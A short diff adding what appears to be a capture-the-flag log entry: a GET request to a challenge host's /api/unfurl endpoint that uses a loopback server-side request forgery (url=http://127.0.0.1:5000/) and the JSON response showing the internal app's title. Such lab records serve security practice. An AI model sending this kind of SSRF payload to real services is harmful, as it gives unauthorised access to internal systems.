@@ -1,0 +1,14 @@
+# app root through the loopback SSRF, returns a title
+GET http://meshgate-f1a5eea8fd01ddea.challs.ctf.thefewchosen.com/api/unfurl?url=http%3A%2F%2F127.0.0.1%3A5000%2F
+HTTP 200
+Content-Length: 320
+Content-Type: application/json
+Date: Sun, 06 Sep 2026 13:21:07 GMT
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+Referrer-Policy: no-referrer
+Server: nginx
+Vary: Cookie
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+
+{"content_type":"text/html; charset=utf-8","snippet":"Meshgate :root{ --bg:#0d1117; --panel:#161b22; --panel-2:#1b2230; --panel-3:#212a38; --edge:rgba(255,255,255,.06); --edge-2:rgba(255,255,255,.10); --text:#e6edf3; --muted:#9198a3; --accent:#3b82f6; --","status":200,"title":"Meshgate","url":"http://127.0.0.1:5000/"}
